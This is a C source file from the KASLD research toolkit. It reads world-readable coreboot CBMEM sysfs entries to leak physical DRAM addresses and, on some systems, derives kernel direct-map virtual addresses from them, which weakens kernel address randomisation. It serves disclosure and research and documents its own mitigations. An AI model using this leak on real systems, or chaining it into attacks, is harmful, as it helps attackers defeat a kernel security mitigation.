// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Read physical memory addresses of coreboot memory (CBMEM) entries from
// the coreboot sysfs bus.
//
// The coreboot firmware populates a table of memory entries (CBMEM) in
// physical DRAM at boot. The Linux kernel driver enumerates these entries
// and exposes each one's physical base address via sysfs:
//
//   /sys/bus/coreboot/devices/cbmem-<id>/address  (physical base, 0x%llx)
//   /sys/bus/coreboot/devices/cbmem-<id>/size      (region size)
//
// The 'address' attribute is created with DEVICE_ATTR_RO (S_IRUGO, 0444)
// in drivers/firmware/google/cbmem.c — no capability check,
// world-readable. The value is cbmem_entry.address (uint64_t physical
// address of the CBMEM region in DRAM).
//
// CBMEM regions include firmware log, ACPI tables, timestamps, and other
// platform data. All are placed in physical DRAM by coreboot.
//
// On ARM Chromebooks without CONFIG_RANDOMIZE_BASE, the physical address
// directly yields a linear-map kernel virtual address:
//   arm32/arm64: va = phys + PAGE_OFFSET - PHYS_OFFSET
//
// Leak primitive:
//   Data leaked:      physical DRAM address of coreboot CBMEM entries
//   Kernel subsystem: drivers/firmware/google — /sys/bus/coreboot/devices/
//   Data structure:   struct lb_cbmem_entry → address (uint64_t)
//   Address type:     physical (DRAM)
//   Method:           parsed (sysfs text attribute)
//   Status:           unfixed (information exposure by design)
//   Access check:     none (world-readable via DEVICE_ATTR_RO / S_IRUGO)
//   Source:
//   https://elixir.bootlin.com/linux/latest/source/drivers/firmware/google/cbmem.c
//
// Mitigations:
//   CONFIG_GOOGLE_CBMEM=n removes the sysfs entries. On x86_64 with
//   CONFIG_RANDOMIZE_MEMORY enabled, physical addresses do not directly
//   reveal the virtual text base.
//
// Requires:
// - CONFIG_GOOGLE_CBMEM (selected on coreboot/Chromebook systems)
// - coreboot firmware with CBMEM entries
//
// References:
// https://elixir.bootlin.com/linux/latest/source/drivers/firmware/google/cbmem.c
// https://www.coreboot.org/CBMEM
// ---
// <bcoles@gmail.com>

#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

KASLD_EXPLAIN(
    "Reads physical DRAM addresses of coreboot CBMEM entries from "
    "/sys/bus/coreboot/devices/cbmem-*/address. The coreboot CBMEM driver "
    "exposes each entry's physical base address with world-readable (0444) "
    "DEVICE_ATTR_RO attributes — no capability check, not gated by "
    "kptr_restrict. On ARM Chromebook systems with a fixed physical-to-"
    "virtual mapping, these DRAM addresses yield linear-map kernel virtual "
    "addresses. Requires CONFIG_GOOGLE_CBMEM.");

// Untested: no coreboot/Chromebook hardware available for testing.
KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:physical\n"
           "status:experimental\n"
           "config:CONFIG_GOOGLE_CBMEM\n");

static int read_file_line(const char *path, char *buf, size_t len) {
  FILE *f = fopen(path, "r");
  if (!f)
    return -1;
  if (fgets(buf, (int)len, f) == NULL) {
    fclose(f);
    return -1;
  }
  fclose(f);
  buf[strcspn(buf, "\n")] = '\0';
  return 0;
}

int main(void) {
  const char *base = "/sys/bus/coreboot/devices";
  DIR *d;
  struct dirent *ent;
  char path[512];
  char buf[256];
  char label[128];
  int count = 0;

  fprintf(stderr,
          "[.] searching %s for CBMEM physical memory "
          "addresses ...\n",
          base);

  d = opendir(base);
  if (!d) {
    if (errno == EACCES || errno == EPERM)
      return KASLD_EXIT_NOPERM;
    /* /sys/bus/coreboot absent if CONFIG_GOOGLE_COREBOOT_TABLE is not enabled
     */
    return KASLD_EXIT_UNAVAILABLE;
  }

  while ((ent = readdir(d)) != NULL) {
    /* CBMEM entries are named cbmem-XXXXXXXX (8-digit hex tag) */
    if (strncmp(ent->d_name, "cbmem-", 6) != 0)
      continue;

    snprintf(path, sizeof(path), "%s/%s/address", base, ent->d_name);

    if (read_file_line(path, buf, sizeof(buf)) < 0)
      continue;

    unsigned long long addr = 0;
    if (sscanf(buf, "0x%llx", &addr) != 1)
      continue;

    if (!addr)
      continue;

    /* CBMEM (CoreBoot's bookkeeping table) is firmware-reserved memory.
     * The CBMEM entry directory name (e.g. "cb_acpi") identifies which
     * coreboot subsystem allocated it. */
    snprintf(label, sizeof(label), "%.32s", ent->d_name);

    fprintf(stderr, "[+] sysfs_cbmem %s: phys = 0x%016llx\n", label, addr);
    kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, (unsigned long)addr,
                 KASLD_REGION_RESERVED_MEM, label);
    count++;

#if !PHYS_VIRT_DECOUPLED
    unsigned long virt = phys_to_virt((unsigned long)addr);
    fprintf(stderr, "[+] sysfs_cbmem %s: directmap va = 0x%016lx\n", label,
            virt);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
                 KASLD_REGION_RESERVED_MEM, label);
#endif
  }
  closedir(d);

  if (!count) {
    fprintf(stderr,
            "[-] no CBMEM entries with non-zero addresses found "
            "in %s\n",
            base);
    return KASLD_EXIT_UNAVAILABLE;
  }

  return 0;
}
